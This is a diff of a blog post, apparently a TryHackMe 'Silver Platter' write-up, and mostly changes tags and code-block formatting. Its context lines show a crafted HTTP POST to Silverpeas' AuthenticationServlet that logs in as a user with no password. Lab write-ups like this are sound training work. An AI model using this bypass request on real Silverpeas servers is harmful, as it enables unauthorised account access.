@@ -2,7 +2,7 @@
 title: Silver Platter - tryhackme, TeneBrae93
 date: 2025-02-13 11:27:10 -5000
 categories: [THM,Easy,Linux]
-tags: [web,Misconfiguration,Authentication Bypass]
+tags: [Web,Misconfiguration,authentication bypass]
 ---
 
 Can you breach the server?
@@ -132,7 +132,7 @@ Then the login attempt will (usually) succeed and redirect you to the main page.
 The provided `PoC` works flawlessly, I was able to log in as `scr1ptkiddy` without even needing a password.
 
 - By crafting Burpsuite Request like this:
-{% highlight python linenos %}
+````console
 POST /silverpeas/AuthenticationServlet HTTP/1.1
 Host: silverplatter.thm:8080
 Content-Type: application/x-www-form-urlencoded
@@ -142,7 +142,7 @@ Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 Login=scr1ptkiddy&DomainId=0
-{% endhighlight %}
+````
 
 After accessing the `Silverpeas` Dashboard,
 ![silverpeasloginpage.png](Assets/Pictures/SilverPlatter/login-success.png)
